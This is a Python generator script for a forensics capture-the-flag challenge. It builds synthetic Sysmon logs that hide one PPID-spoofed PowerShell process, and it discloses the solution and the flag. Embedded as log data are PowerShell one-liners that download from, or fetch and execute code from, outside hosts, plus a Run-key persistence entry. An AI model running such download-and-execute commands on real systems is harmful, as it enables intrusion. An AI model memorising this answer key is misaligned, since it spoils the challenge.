#!/usr/bin/env python3
"""
gen.py -- author-side generator for the "evasion-timeline" forensics challenge.

Builds sysmon.jsonl: newline-delimited JSON of synthetic Sysmon-style telemetry
from a single Windows host over a ~35 minute window. The data is ORIGINAL and
generated here (no third-party sample corpus is used or shipped).

The host runs a believable process tree (boot chain -> services -> an interactive
session with browsers, Office, dev tools, updaters, scheduled tasks) plus a lot
of realistic noise: image loads, DNS queries, outbound connections, temp-file
writes, and registry autoruns.

Hidden in the noise is exactly ONE defense-evasion artifact
(MITRE ATT&CK T1134.004 -- Parent Process ID / PPID spoofing):

  A malicious process is launched with a *forged parent*. Sysmon faithfully
  records the (spoofed) ParentProcessId / ParentProcessGuid it was given -- but
  that parent was a short-lived, legitimate process that had ALREADY TERMINATED
  (there is an EventID 5 Process-Terminate for its ProcessGuid) seconds before
  the child's EventID 1 Process-Create. A dead process cannot spawn a child, so
  the recorded ancestry is impossible. That single broken parent/child edge is
  the only such violation in the whole log.

  Everything else about the malicious process is designed to blend in: a
  system-like image path, a plausible signed-looking parent image, and a
  PowerShell -EncodedCommand that looks like the several *benign* encoded
  commands elsewhere in the capture. It is only distinguishable by correlating
  the timeline.

The flag is STATIC and lives, base64/UTF-16LE-encoded, in the malicious
process's CommandLine (a PowerShell -enc blob). One decoy process carries a
different, flag-shaped NCTF{...} string in ITS encoded command, but that decoy
has a perfectly valid, still-alive parent -- so it is not "what evaded
detection". Only the process with the impossible ancestry carries the real flag.

Deterministic: fixed RNG seed => identical sysmon.jsonl every run.

    python3 gen.py            # writes ./sysmon.jsonl

gen.py is intentionally NOT part of the player handout (see challenge.yml files:).
"""
import base64
import hashlib
import json
import random
from datetime import datetime, timedelta

SEED = 0xE7A51
OUT = "sysmon.jsonl"
COMPUTER = "FIN-WIN11-07.corp.northwind.internal"
CHANNEL = "Microsoft-Windows-Sysmon/Operational"

# ---------------------------------------------------------------------------
# The flag lives (base64/UTF-16LE) inside the malicious process CommandLine.
# The trailing token echoes the spoofed ParentProcessId so the solver can
# confirm the IOC <-> flag correspondence deterministically.
# ---------------------------------------------------------------------------
SPOOF_PARENT_PID = 6284
FLAG = "NCTF{ppid_sp00f_dead_parent_6284}"

rng = random.Random(SEED)


# ---- deterministic pseudo-identifiers -------------------------------------
_guid_counter = [0]


def new_guid():
    _guid_counter[0] += 1
    h = hashlib.sha1(f"guid-{SEED}-{_guid_counter[0]}".encode()).hexdigest()
    return ("{%s-%s-%s-%s-%s}" % (h[0:8], h[8:12], h[12:16], h[16:20], h[20:32])).upper()


def fake_hashes(image, salt=""):
    base = (image + salt).encode()
    md5 = hashlib.md5(base).hexdigest().upper()
    sha256 = hashlib.sha256(base).hexdigest().upper()
    imp = hashlib.md5(b"imp" + base).hexdigest().upper()
    return f"MD5={md5},SHA256={sha256},IMPHASH={imp}"


def fmt(ts: datetime) -> str:
    # Sysmon UtcTime style: "2024-11-05 14:23:47.123"
    return ts.strftime("%Y-%m-%d %H:%M:%S.") + f"{ts.microsecond // 1000:03d}"


# ---- global state ----------------------------------------------------------
EVENTS = []           # list of dict rows
PROCS = {}            # guid -> process descriptor

USER_SYSTEM = "NT AUTHORITY\\SYSTEM"
USER_NET = "NT AUTHORITY\\NETWORK SERVICE"
USER_LOCAL = "NT AUTHORITY\\LOCAL SERVICE"
USER_INT = "CORP\\j.okafor"

LOGON_INT = "0x3f9a21"
LOGON_SYS = "0x3e7"

T0 = datetime(2024, 11, 5, 8, 12, 3, 0)   # capture start


def add_event(ts, row):
    row = dict(row)
    row["UtcTime"] = fmt(ts)
    row.setdefault("Channel", CHANNEL)
    row.setdefault("Computer", COMPUTER)
    EVENTS.append((ts, row))


def spawn(image, cmdline, parent_guid, start, end, user=USER_INT,
          integrity="Medium", logon_id=LOGON_INT, session=1, pid=None,
          hashes_salt="", cwd=None, extra_cmd_desc=None):
    """Register a process, emit its ProcessCreate (and later ProcessTerminate)."""
    guid = new_guid()
    if pid is None:
        pid = rng.randint(1500, 9990)
    parent = PROCS.get(parent_guid)
    if parent:
        p_pid = parent["pid"]
        p_image = parent["image"]
        p_cmd = parent["cmdline"]
        p_user = parent["user"]
    else:
        # root / out-of-capture ancestor
        p_pid = 4
        p_image = "System"
        p_cmd = ""
        p_user = USER_SYSTEM
    desc = {
        "guid": guid, "pid": pid, "image": image, "cmdline": cmdline,
        "user": user, "start": start, "end": end,
        "parent_guid": parent_guid, "session": session, "logon_id": logon_id,
    }
    PROCS[guid] = desc

    name = image.rsplit("\\", 1)[-1]
    add_event(start, {
        "EventID": 1,
        "RuleName": "-",
        "ProcessGuid": guid,
        "ProcessId": pid,
        "Image": image,
        "FileVersion": "10.0.22621.1 (WinBuild.160101.0800)",
        "Description": name,
        "Product": "Microsoft\u00ae Windows\u00ae Operating System",
        "Company": "Microsoft Corporation",
        "OriginalFileName": name,
        "CommandLine": cmdline,
        "CurrentDirectory": cwd or "C:\\Windows\\system32\\",
        "User": user,
        "LogonGuid": guid,
        "LogonId": logon_id,
        "TerminalSessionId": session,
        "IntegrityLevel": integrity,
        "Hashes": fake_hashes(image, hashes_salt),
        "ParentProcessGuid": parent_guid if parent else "{00000000-0000-0000-0000-000000000000}",
        "ParentProcessId": p_pid,
        "ParentImage": p_image,
        "ParentCommandLine": p_cmd,
        "ParentUser": p_user,
    })
    if end is not None:
        add_event(end, {
            "EventID": 5,
            "RuleName": "-",
            "ProcessGuid": guid,
            "ProcessId": pid,
            "Image": image,
            "User": user,
        })
    return guid


def emit_imageload(proc_guid, ts, dll, signer="Microsoft Corporation",
                   status="Valid", signed="true"):
    p = PROCS[proc_guid]
    add_event(ts, {
        "EventID": 7,
        "RuleName": "-",
        "ProcessGuid": proc_guid,
        "ProcessId": p["pid"],
        "Image": p["image"],
        "ImageLoaded": dll,
        "FileVersion": "10.0.22621.1",
        "Description": dll.rsplit("\\", 1)[-1],
        "Product": "Microsoft\u00ae Windows\u00ae Operating System",
        "Company": signer,
        "OriginalFileName": dll.rsplit("\\", 1)[-1],
        "Hashes": fake_hashes(dll),
        "Signed": signed,
        "Signature": signer,
        "SignatureStatus": status,
        "User": p["user"],
    })


def emit_net(proc_guid, ts, dip, dport, dhost, proto="tcp", sip="10.20.14.37"):
    p = PROCS[proc_guid]
    add_event(ts, {
        "EventID": 3,
        "RuleName": "-",
        "ProcessGuid": proc_guid,
        "ProcessId": p["pid"],
        "Image": p["image"],
        "User": p["user"],
        "Protocol": proto,
        "Initiated": "true",
        "SourceIsIpv6": "false",
        "SourceIp": sip,
        "SourcePort": rng.randint(49152, 65500),
        "DestinationIsIpv6": "false",
        "DestinationIp": dip,
        "DestinationPort": dport,
        "DestinationHostname": dhost,
        "DestinationPortName": "-",
    })


def emit_dns(proc_guid, ts, qname, results):
    p = PROCS[proc_guid]
    add_event(ts, {
        "EventID": 22,
        "RuleName": "-",
        "ProcessGuid": proc_guid,
        "ProcessId": p["pid"],
        "QueryName": qname,
        "QueryStatus": "0",
        "QueryResults": results,
        "Image": p["image"],
        "User": p["user"],
    })


def emit_file(proc_guid, ts, target, ctime=None):
    p = PROCS[proc_guid]
    add_event(ts, {
        "EventID": 11,
        "RuleName": "-",
        "ProcessGuid": proc_guid,
        "ProcessId": p["pid"],
        "Image": p["image"],
        "TargetFilename": target,
        "CreationUtcTime": fmt(ctime or ts),
        "User": p["user"],
    })


def emit_reg(proc_guid, ts, target, details, etype="SetValue"):
    p = PROCS[proc_guid]
    add_event(ts, {
        "EventID": 13,
        "RuleName": "-",
        "EventType": etype,
        "ProcessGuid": proc_guid,
        "ProcessId": p["pid"],
        "Image": p["image"],
        "TargetObject": target,
        "Details": details,
        "User": p["user"],
    })


def ps_encode(script: str) -> str:
    """PowerShell -EncodedCommand style: base64 of UTF-16LE bytes."""
    return base64.b64encode(script.encode("utf-16-le")).decode("ascii")


# ===========================================================================
# 1) Boot / service backbone (long-lived; no terminate inside the window)
# ===========================================================================
def build_backbone():
    g_system = spawn("System", "", None, T0, None,
                     user=USER_SYSTEM, integrity="System", logon_id=LOGON_SYS,
                     session=0, pid=4)
    g_smss = spawn("C:\\Windows\\System32\\smss.exe", "\\SystemRoot\\System32\\smss.exe",
                   g_system, T0 + timedelta(seconds=1), None, user=USER_SYSTEM,
                   integrity="System", logon_id=LOGON_SYS, session=0, pid=452)
    g_wininit = spawn("C:\\Windows\\System32\\wininit.exe", "wininit.exe",
                      g_smss, T0 + timedelta(seconds=2), None, user=USER_SYSTEM,
                      integrity="System", logon_id=LOGON_SYS, session=0, pid=764)
    g_services = spawn("C:\\Windows\\System32\\services.exe", "C:\\Windows\\system32\\services.exe",
                       g_wininit, T0 + timedelta(seconds=3), None, user=USER_SYSTEM,
                       integrity="System", logon_id=LOGON_SYS, session=0, pid=812)
    spawn("C:\\Windows\\System32\\lsass.exe", "C:\\Windows\\system32\\lsass.exe",
          g_wininit, T0 + timedelta(seconds=3), None, user=USER_SYSTEM,
          integrity="System", logon_id=LOGON_SYS, session=0, pid=824)

    # svchost instances under services.exe
    svc_groups = ["-k DcomLaunch -p", "-k RPCSS -p", "-k netsvcs -p",
                  "-k LocalService", "-k NetworkService -p", "-k termsvcs",
                  "-k LocalSystemNetworkRestricted -p", "-k WbioSvcGroup",
                  "-k appmodel -p", "-k utcsvc -p"]
    svchosts = []
    for i, grp in enumerate(svc_groups):
        u = USER_SYSTEM if "System" in grp or "netsvcs" in grp or "Dcom" in grp else (
            USER_LOCAL if "LocalService" in grp else USER_NET)
        g = spawn("C:\\Windows\\System32\\svchost.exe",
                  f"C:\\Windows\\system32\\svchost.exe {grp}",
                  g_services, T0 + timedelta(seconds=4 + i), None, user=u,
                  integrity="System", logon_id=LOGON_SYS, session=0,
                  pid=900 + i * 4, hashes_salt=grp)
        svchosts.append(g)

    # interactive session chain
    g_winlogon = spawn("C:\\Windows\\System32\\winlogon.exe", "winlogon.exe",
                       g_smss, T0 + timedelta(seconds=6), None, user=USER_SYSTEM,
                       integrity="System", logon_id=LOGON_SYS, session=1, pid=1044)
    g_userinit = spawn("C:\\Windows\\System32\\userinit.exe", "C:\\Windows\\system32\\userinit.exe",
                       g_winlogon, T0 + timedelta(seconds=40), T0 + timedelta(seconds=44),
                       user=USER_INT, integrity="Medium", session=1, pid=3120)
    g_explorer = spawn("C:\\Windows\\explorer.exe", "C:\\Windows\\Explorer.EXE",
                       g_userinit, T0 + timedelta(seconds=42), None, user=USER_INT,
                       integrity="Medium", session=1, pid=4012)
    return {
        "system": g_system, "services": g_services, "winlogon": g_winlogon,
        "explorer": g_explorer, "svchosts": svchosts,
    }


# ===========================================================================
# 2) Interactive user apps under explorer (long-lived)
# ===========================================================================
BROWSER_HOSTS = [
    ("chrome.exe", "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
     "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\""),
    ("msedge.exe", "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
     "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\""),
    ("OUTLOOK.EXE", "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
     "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\""),
    ("Teams.exe", "C:\\Users\\j.okafor\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe",
     "\"C:\\Users\\j.okafor\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe\""),
    ("Code.exe", "C:\\Users\\j.okafor\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe",
     "\"C:\\Users\\j.okafor\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe\""),
]

BENIGN_DOMAINS = [
    ("clients2.google.com", "172.217.16.174"),
    ("outlook.office365.com", "52.96.104.34"),
    ("teams.microsoft.com", "52.113.194.132"),
    ("ctldl.windowsupdate.com", "88.221.93.19"),
    ("login.microsoftonline.com", "20.190.159.73"),
    ("update.code.visualstudio.com", "13.107.42.16"),
    ("pypi.org", "151.101.0.223"),
    ("github.com", "140.82.113.4"),
    ("nvd.nist.gov", "23.203.248.58"),
    ("crl.microsoft.com", "23.35.229.160"),
]

USER_DLLS = [
    "C:\\Windows\\System32\\kernel32.dll", "C:\\Windows\\System32\\ntdll.dll",
    "C:\\Windows\\System32\\user32.dll", "C:\\Windows\\System32\\gdi32.dll",
    "C:\\Windows\\System32\\ole32.dll", "C:\\Windows\\System32\\combase.dll",
    "C:\\Windows\\System32\\shcore.dll", "C:\\Windows\\System32\\rpcrt4.dll",
    "C:\\Windows\\System32\\advapi32.dll", "C:\\Windows\\System32\\crypt32.dll",
    "C:\\Windows\\System32\\wininet.dll", "C:\\Windows\\System32\\winhttp.dll",
]


def build_userland(bb):
    g_explorer = bb["explorer"]
    long_lived = []
    for i, (name, image, cmd) in enumerate(BROWSER_HOSTS):
        start = T0 + timedelta(seconds=60 + i * 7 + rng.randint(0, 5))
        g = spawn(image, cmd, g_explorer, start, None, user=USER_INT, pid=None,
                  cwd="C:\\Users\\j.okafor\\")
        long_lived.append(g)
        # renderer/child processes for chrome/edge
        if name in ("chrome.exe", "msedge.exe"):
            for _ in range(rng.randint(8, 14)):
                cs = start + timedelta(seconds=rng.randint(1, 120))
                ctype = rng.choice(["renderer", "renderer", "gpu-process",
                                    "utility", "crashpad-handler"])
                spawn(image, cmd + f" --type={ctype} --lang=en-US", g,
                      cs, cs + timedelta(minutes=rng.randint(5, 25)),
                      user=USER_INT, pid=None, cwd="C:\\Users\\j.okafor\\")
    return long_lived


# ===========================================================================
# 3) Short-lived legit processes (the noise that also PROVIDES cover):
#    updaters, conhost, taskhostw, background tasks, scheduled tasks, and
#    -- importantly -- benign PowerShell with -EncodedCommand.
# ===========================================================================
BENIGN_PS_SCRIPTS = [
    "Get-WmiObject Win32_Product | Select-Object Name,Version | Export-Csv "
    "$env:TEMP\\inv.csv -NoTypeInformation",
    "Get-ScheduledTask | Where-Object State -eq 'Running' | "
    "Select TaskName,TaskPath | ConvertTo-Json",
    "Compress-Archive -Path C:\\Users\\j.okafor\\Documents\\reports\\* "
    "-DestinationPath C:\\Users\\j.okafor\\backup\\reports.zip -Force",
    "Get-EventLog -LogName Security -Newest 200 | "
    "Group-Object InstanceId | Sort-Object Count -Descending",
]

# The decoy: a hidden downloader with a flag-shaped token, but launched by a
# perfectly valid, still-alive parent (explorer). NOT self-labelled.
DECOY_PS = ("$w=New-Object Net.WebClient;"
            "$t='NCTF{h1dden_p0wersh3ll_d0wnl04d3r_2f1a}';"
            "$w.DownloadFile('http://cdn.northwind-cache.com/pkg.dat',"
            "\"$env:TEMP\\pkg.dat\")")


def build_shortlived(bb, long_lived):
    g_explorer = bb["explorer"]
    g_services = bb["services"]
    svchosts = bb["svchosts"]

    # updaters spawned by services / svchost, each short-lived and terminated
    for i in range(6):
        t = T0 + timedelta(minutes=2 + i * 4, seconds=rng.randint(0, 50))
        parent = rng.choice(svchosts)
        g = spawn("C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe",
                  "\"C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe\" /ua /installsource scheduler",
                  parent, t, t + timedelta(seconds=rng.randint(3, 12)),
                  user=USER_SYSTEM, integrity="System", session=0)
        emit_net(g, t + timedelta(seconds=1), "142.250.72.131", 443, "update.googleapis.com")

    # taskhostw / conhost / backgroundTaskHost churn
    task_images = [
        ("C:\\Windows\\System32\\taskhostw.exe", "taskhostw.exe {DE1B2C6A}"),
        ("C:\\Windows\\System32\\conhost.exe", "\\??\\C:\\Windows\\system32\\conhost.exe 0x4"),
        ("C:\\Windows\\System32\\backgroundTaskHost.exe",
         "\"C:\\Windows\\system32\\backgroundTaskHost.exe\" -ServerName:App.AppXbp.mca"),
        ("C:\\Windows\\System32\\RuntimeBroker.exe", "C:\\Windows\\System32\\RuntimeBroker.exe -Embedding"),
        ("C:\\Windows\\System32\\dllhost.exe", "C:\\Windows\\system32\\DllHost.exe /Processid:{AB8902B4}"),
    ]
    for i in range(260):
        img, cmd = rng.choice(task_images)
        parent = rng.choice(svchosts + [g_explorer])
        t = T0 + timedelta(minutes=rng.randint(1, 33), seconds=rng.randint(0, 59),
                           milliseconds=rng.randint(0, 999))
        gt = spawn(img, cmd, parent, t, t + timedelta(seconds=rng.randint(1, 40)),
                   user=PROCS[parent]["user"],
                   integrity="Medium" if parent == g_explorer else "System",
                   session=1 if parent == g_explorer else 0)
        for _ in range(rng.randint(1, 4)):
            emit_imageload(gt, t + timedelta(milliseconds=rng.randint(50, 900)),
                           rng.choice(USER_DLLS))

    # benign interactive PowerShell / cmd sessions under explorer, some -enc
    for i, script in enumerate(BENIGN_PS_SCRIPTS):
        t = T0 + timedelta(minutes=6 + i * 5, seconds=rng.randint(0, 40))
        enc = ps_encode(script)
        g = spawn("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                  f"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand {enc}",
                  g_explorer, t, t + timedelta(seconds=rng.randint(4, 20)),
                  user=USER_INT, integrity="Medium", session=1,
                  cwd="C:\\Users\\j.okafor\\")
        # its conhost
        spawn("C:\\Windows\\System32\\conhost.exe", "\\??\\C:\\Windows\\system32\\conhost.exe 0x4",
              g, t, t + timedelta(seconds=rng.randint(4, 20)),
              user=USER_INT, integrity="Medium", session=1)

    # the DECOY encoded-PowerShell downloader: valid live parent (explorer)
    t_decoy = T0 + timedelta(minutes=19, seconds=11)
    enc_decoy = ps_encode(DECOY_PS)
    g_decoy = spawn("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    f"powershell.exe -nop -w hidden -EncodedCommand {enc_decoy}",
                    g_explorer, t_decoy, t_decoy + timedelta(seconds=6),
                    user=USER_INT, integrity="Medium", session=1,
                    cwd="C:\\Users\\j.okafor\\", hashes_salt="decoy")
    emit_net(g_decoy, t_decoy + timedelta(seconds=1), "104.21.5.44", 80,
             "cdn.northwind-cache.com")

    return None


# ===========================================================================
# 4) THE ANOMALY: PPID-spoofed malicious process with a DEAD parent.
# ===========================================================================
def build_anomaly(bb):
    g_services = bb["services"]

    # A short-lived, entirely legitimate host process that runs and TERMINATES.
    # Its PID (SPOOF_PARENT_PID) and GUID are what the attacker forges as parent.
    t_parent_start = T0 + timedelta(minutes=21, seconds=4)
    t_parent_end = T0 + timedelta(minutes=21, seconds=9)     # lives ~5s
    g_deadparent = spawn(
        "C:\\Windows\\System32\\wermgr.exe",
        "C:\\Windows\\system32\\wermgr.exe -upload",
        g_services, t_parent_start, t_parent_end,
        user=USER_SYSTEM, integrity="System", session=0,
        pid=SPOOF_PARENT_PID, hashes_salt="wermgr")
    emit_imageload(g_deadparent, t_parent_start + timedelta(seconds=1),
                   "C:\\Windows\\System32\\wer.dll")

    # ~28 seconds AFTER the parent already terminated, the malicious child is
    # created claiming that dead parent's PID/GUID. Impossible ancestry.
    t_child = T0 + timedelta(minutes=21, seconds=37)
    payload = (f"$p={SPOOF_PARENT_PID};$c='{FLAG}';"
               "$k=[Text.Encoding]::UTF8.GetBytes($c);"
               "iex(New-Object Net.WebClient).DownloadString("
               "'http://185.220.101.47/loader.ps1')")
    enc = ps_encode(payload)
    g_mal = spawn(
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        f"powershell.exe -nop -w hidden -ep bypass -enc {enc}",
        g_deadparent,           # <-- forged parent (already dead)
        t_child, t_child + timedelta(seconds=9),
        user=USER_SYSTEM, integrity="System", session=0,
        hashes_salt="malicious")

    # give the malicious process some believable follow-on activity
    emit_imageload(g_mal, t_child + timedelta(seconds=1),
                   "C:\\Windows\\System32\\amsi.dll")
    emit_dns(g_mal, t_child + timedelta(seconds=2), "185.220.101.47.nip.io",
             "185.220.101.47")
    emit_net(g_mal, t_child + timedelta(seconds=2), "185.220.101.47", 80,
             "-")
    emit_reg(g_mal, t_child + timedelta(seconds=3),
             "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WerSvcHelper",
             "\"C:\\Users\\Public\\wsvc.ps1\"")
    emit_file(g_mal, t_child + timedelta(seconds=3),
              "C:\\Users\\Public\\wsvc.ps1",
              ctime=t_child + timedelta(seconds=3))


# ===========================================================================
# 5) Bulk noise: image loads / dns / net / file / registry for live procs
# ===========================================================================
def build_noise(bb, long_lived):
    svchosts = bb["svchosts"]
    # image loads for user apps
    for g in long_lived:
        p = PROCS[g]
        n = rng.randint(30, 60)
        for _ in range(n):
            t = p["start"] + timedelta(seconds=rng.randint(1, 900))
            emit_imageload(g, t, rng.choice(USER_DLLS))
    # DNS + net churn for browsers / office
    for g in long_lived:
        for _ in range(rng.randint(40, 90)):
            host, ip = rng.choice(BENIGN_DOMAINS)
            t = PROCS[g]["start"] + timedelta(seconds=rng.randint(2, 1500))
            emit_dns(g, t, host, ip)
            emit_net(g, t + timedelta(milliseconds=rng.randint(30, 600)),
                     ip, rng.choice([443, 443, 443, 80]), host)
    # svchost background net (windows update / telemetry)
    for g in svchosts:
        for _ in range(rng.randint(15, 40)):
            host, ip = rng.choice(BENIGN_DOMAINS[3:])
            t = T0 + timedelta(minutes=rng.randint(1, 33), seconds=rng.randint(0, 59))
            emit_net(g, t, ip, 443, host)
    # temp-file writes + registry autoruns from browsers/office
    for g in long_lived:
        for _ in range(rng.randint(15, 40)):
            t = PROCS[g]["start"] + timedelta(seconds=rng.randint(5, 1500))
            fn = rng.choice([
                "C:\\Users\\j.okafor\\AppData\\Local\\Temp\\%d.tmp" % rng.randint(1000, 9999),
                "C:\\Users\\j.okafor\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\cache_%d.dat" % rng.randint(10, 99),
                "C:\\Users\\j.okafor\\AppData\\Roaming\\Microsoft\\Teams\\logs.txt",
            ])
            emit_file(g, t, fn)
    # a scattering of registry sets
    for _ in range(200):
        g = rng.choice(long_lived + svchosts)
        t = T0 + timedelta(minutes=rng.randint(1, 33), seconds=rng.randint(0, 59))
        emit_reg(g, t,
                 rng.choice([
                     "HKU\\S-1-5-21-99\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs",
                     "HKLM\\SYSTEM\\CurrentControlSet\\Services\\bam\\State\\UserSettings",
                     "HKU\\S-1-5-21-99\\Software\\Google\\Chrome\\PreferenceMACs",
                 ]),
                 "Binary Data")


def main():
    bb = build_backbone()
    long_lived = build_userland(bb)
    build_shortlived(bb, long_lived)
    build_anomaly(bb)
    build_noise(bb, long_lived)

    # stable sort by timestamp; ties broken by insertion order (stable)
    EVENTS.sort(key=lambda e: e[0])
    with open(OUT, "w", encoding="utf-8") as f:
        for _, row in EVENTS:
            f.write(json.dumps(row, ensure_ascii=False) + "\n")

    counts = {}
    for _, r in EVENTS:
        counts[r["EventID"]] = counts.get(r["EventID"], 0) + 1
    print(f"wrote {OUT}: {len(EVENTS)} events")
    print("by EventID:", dict(sorted(counts.items())))
    print(f"spoofed parent pid = {SPOOF_PARENT_PID}  flag = {FLAG}")


if __name__ == "__main__":
    main()
